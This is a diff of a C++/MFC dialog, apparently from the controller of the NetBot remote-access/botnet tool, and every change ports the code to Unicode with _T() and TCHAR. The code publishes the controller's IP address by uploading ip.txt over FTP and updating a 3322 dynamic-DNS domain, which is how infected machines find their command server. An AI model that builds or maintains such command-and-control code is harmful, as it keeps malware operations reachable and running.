@@ -99,7 +99,7 @@ BOOL CUpdateDlg::OnInitDialog()
 				CString addr;
 				if (j > 0)
 					str += ".";
-				addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
+				addr.Format(_T("%u"), (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
 				str += addr;
 			}
 			m_Combo_DnsIP.AddString(str);
@@ -111,7 +111,7 @@ BOOL CUpdateDlg::OnInitDialog()
 
 	//   WSACleanup();
 		//---------------------------
-	GetDlgItem(IDC_COMBO_FTPPORT)->SetWindowText("1986");
+	GetDlgItem(IDC_COMBO_FTPPORT)->SetWindowText(_T("1986"));
 	UpdateData(FALSE);
 	return TRUE;
 }
@@ -125,13 +125,13 @@ void CUpdateDlg::OnBtnFtpupdate()
 	GetDlgItem(IDC_COMBO_FTPIP)->GetWindowText(ip);
 	GetDlgItem(IDC_COMBO_FTPPORT)->GetWindowText(str);
 	ip = "[" + ip + ":" + str + "]";
-	HANDLE hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFile(_T("ip.txt"), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD numWrite;
 	WriteFile(hFile, ip, ip.GetLength(), &numWrite, NULL);
 	CloseHandle(hFile);
 
 	//保存配置信息
-	str.Format("%d", m_FtpPort);
+	str.Format(_T("%d"), m_FtpPort);
 	m_Ini.SetKeyValue("FTP Setting", "FtpAddress", m_FtpIP);
 	m_Ini.SetKeyValue("FTP Setting", "FtpPort", str);
 	m_Ini.SetKeyValue("FTP Setting", "FtpUsername", m_FtpUser);
@@ -168,7 +168,7 @@ void CUpdateDlg::OnBtnDnsupdate()
 	CHttpFile * pHttpFile = (CHttpFile*)m_Session.OpenURL(strUrl);
 	if (pHttpFile == NULL)
 	{
-		MessageBox("Update Error!", "3322 Domain");
+		MessageBox(_T("Update Error!"), _T("3322 Domain"));
 		m_Session.Close();
 		return;
 	}
@@ -177,7 +177,7 @@ void CUpdateDlg::OnBtnDnsupdate()
 	pHttpFile->Close();
 	m_Session.Close();
 
-	MessageBox(strTemp, "3322 Domian");
+	MessageBox(strTemp, _T("3322 Domian"));
 
 	//保存配置信息
 	m_Ini.SetKeyValue("DNS Setting", "DnsUser", m_DnsUser);
@@ -187,15 +187,15 @@ void CUpdateDlg::OnBtnDnsupdate()
 
 void CUpdateDlg::ReadIniFile()
 {
-	char Path[255];
+	TCHAR Path[255];
 	GetCurrentDirectory(255, Path);
 	CString path;
-	path.Format("%s\\NetBot.ini", Path);
+	path.Format(_T("%s\\NetBot.ini"), Path);
 	if (m_Ini.SetPath(path))
 	{
 		m_FtpIP = m_Ini.GetKeyValue("FTP Setting", "FtpAddress");
 		CString temp = m_Ini.GetKeyValue("FTP Setting", "FtpPort");
-		m_FtpPort = atoi(temp);
+		m_FtpPort = _ttoi(temp);
 		m_FtpUser = m_Ini.GetKeyValue("FTP Setting", "FtpUsername");
 		m_FtpPass = m_Ini.GetKeyValue("FTP Setting", "FtpPassword");
 		m_FtpUrl = m_Ini.GetKeyValue("FTP Setting", "FilePath");
@@ -221,18 +221,18 @@ DWORD CUpdateDlg::FtpUpdate()
 		//获取错误
 		TCHAR szError[1024];
 		if (pEx->GetErrorMessage(szError, 1024))
-			MessageBox(szError, "FTP更新");
+			MessageBox(szError, _T("FTP更新"));
 		else
-			MessageBox("There was an exception", "FTP更新");
+			MessageBox(_T("There was an exception"), _T("FTP更新"));
 		pEx->Delete();
 
 		return 0;
 	}
 	//上传
-	if (pFTP->PutFile("ip.txt", m_FtpUrl))
-		MessageBox("更新IP成功!", "FTP更新");
+	if (pFTP->PutFile(_T("ip.txt"), m_FtpUrl))
+		MessageBox(_T("更新IP成功!"), _T("FTP更新"));
 	else
-		MessageBox("更新IP失败", "FTP更新");
+		MessageBox(_T("更新IP失败"), _T("FTP更新"));
 
 	pFTP->Close();
 
